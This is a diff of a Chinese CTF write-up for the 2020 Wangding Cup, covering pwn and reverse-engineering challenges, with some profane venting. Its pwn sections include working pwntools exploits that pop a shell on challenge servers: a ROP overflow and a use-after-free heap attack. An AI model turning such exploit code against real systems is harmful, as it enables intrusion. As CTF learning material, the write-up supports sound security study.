@@ -3,8 +3,9 @@ title: 2020网鼎杯write-up(未完)
 date: 2020-05-11 22:57:10
 tags: CTF
 ---
-# PWN  
-## boom1  
+# 青龙组
+## PWN  
+### boom1  
 （这个题目，是以前没有做过的类型，很多分析都是靠猜测，师傅们轻喷……）
 这个题拿到了一脸懵，八百多行代码把我看傻了，首先分析下  
 ![](wdb1.png)  
@@ -34,10 +35,10 @@ exit_hook和malloc_hook差不多，
 详细参考:https://blog.csdn.net/qq_43116977/article/details/105485947   
 那我们只需要将_rtld_global结构体中的__rtld_unlock_recursive劫持为one_gadget就行  
 因为这个结构体是在libc中的，所以我们只需要一个字节一个字节的改，后三位改成one_gadget就能在执行exit函数时getshell了  
-因为我好像环境不太一样了，复现不出getshell的结果来，暂时先贴一个别人的exp，后面等我跑出来了再贴新的代码和截图    
+因为我好像环境不太一样了，复现不出getshell的结果来。贴图贴代码？ 👴贴个几把，👴做不到，偏移都是错的，👴吐了，做个几把，👴做这个题目做得十分暴躁，什么鬼题，最好给👴爬    
 ```python  
-#!/usr/bin/env python
-#coding=utf-8
+##!/usr/bin/env python
+##coding=utf-8
 from pwn import*
 from LibcSearcher import *
 import sys
@@ -76,8 +77,8 @@ def exp():
     p.interactive()
 exp()
 ```  
-# Reverse  
-## bang  
+## Reverse  
+### bang  
 这个题是个Android逆向，首先用PKID查壳，发现是梆梆加固  
 ![](re1.png)
 然后搭好安卓模拟器环境，用[FRIDA-DEXDump](https://github.com/hluwa/FRIDA-DEXDump)工具dump出dex来  
@@ -99,11 +100,112 @@ exp()
 所以我们调试的时候需要用x86架构的server，如果用的arm在模拟器上跑就会报错  
 跑脚本的时候，缺少什么东西直接pip install装上就行  
 ```  
-## joker  
 
+# 白虎组
+## Pwn  
+### of  
+```python  
+from pwn import *
+context.log_level='debug'
 
+p=remote("123.57.225.26",42435)
+rdx_rdi_rsi_syscall=0x400617
+bss=0x601200
+payload='a'*112+p64(bss)+p64(rdx_rdi_rsi_syscall)+p64(0x100)+p64(0)+p64(bss)+p64(bss)
+payload += p64(rdx_rdi_rsi_syscall)+p64(0)+p64(bss)+p64(0)
+p.sendline(payload)
+payload='/bin/sh\x00'
+payload=payload.ljust(58,'\x00')
+p.sendline(payload)
+p.interactive()
+```  
+## reverse  
+### 恶龙  
+这个题在IDA里面看，很多函数，有点复杂，先不管，就看那个菜单，boss这里，盲猜要打赢三个boss，然后执行三个decrypt函数生成flag，最后推出执行outflag  
+![](hero3.png)
+直接gdb调试做，需要让eff大于5000000，我们让程序跑起来看一下eff是多大  
+![](hero1.png)
+可以看到是0x64  
+我们直接用命令set {int}0x603478 = 0x10000000 就能把eff改成0x10000000  
+就满足条件了  
+然后直接c一下，打赢三个boss出flag  
+![](hero2.png)
 
+# 朱雀组  
+## Pwn  
+### 魔法房间  
+水题，参照HITCONtrainning-lab10  
+```python  
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+from LibcSearcher import *
+import sys
+context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './pwn' 
+local = 0
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("59.110.243.101",54621)
+elf=ELF(binary)
+libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
+def add(size,content):
+    p.recvuntil("choice :")
+    p.sendline("1")
+    p.recvuntil("?")
+    p.sendline(str(size))
+    p.recvuntil("name :")
+    p.sendline(content)
 
-思考：这题做下来，好像感觉并不是很难，但是比赛时候没搞它是因为自己怕了，看到那么大的代码量不敢去分析，其实很佩服那些大佬，看到了新的没接触过过的东西即使可能看不懂也硬着头皮搞，而我却连硬着头皮看的勇气都没有，从思想上就胆怯了。。  
-原来每次比赛都能学到东西是大师傅们会把那些题目复现一波，而我一直这么菜原因就是，每次打完了就完事儿了，啥都不管了……  
-这几天先不学新知识了，争取把网鼎的时候看了的题目一个一个复现出来  
+def delete(index):
+    p.recvuntil("choice :")
+    p.sendline("2")
+    p.recvuntil("index :")
+    p.sendline(str(index))
+
+def view(index):
+    p.recvuntil("choice :")
+    p.sendline("3")
+    p.recvuntil("index :")
+    p.sendline(str(index))
+def exp():
+    add(0x40,"aaa")
+    add(0x40,"bbb")
+
+    delete(0)
+    delete(1)
+
+    add(0x18,"a"*8+p64(0x400A0D))
+    view(0)
+    p.interactive()
+exp()
+```   
+### 云盾  
+还没做出来，先咕了  
+## reverse  
+### go  
+go语言写的exe，IDA打开查看主函数  
+![](1.png)
+可以看到，有一个类似于秘钥的东西  
+我们在runtime_text里面找到了这串base64密文  
+![](2.png)
+直接用base64变表解出key  
+```python  
+import base64
+import string
+
+str1 = "nRKKAHzMrQzaqQzKpPHClX=="
+
+string1 = "XYZFGHI2+/Jhi345jklmEnopuvwqrABCDKL6789abMNWcdefgstOPQRSTUVxyz01"
+string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+
+print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))
+# What_is_go_a_A_H
+```  
+输入key即可  
+![](3.png)  
+# 玄武组  
+听说不好做，👴上了一天的课，做个🔨题目，比赛做了很累，👴还有很多事情没做完  
+玄武组的题👴看心情写，有可能毕业了👴都没写  
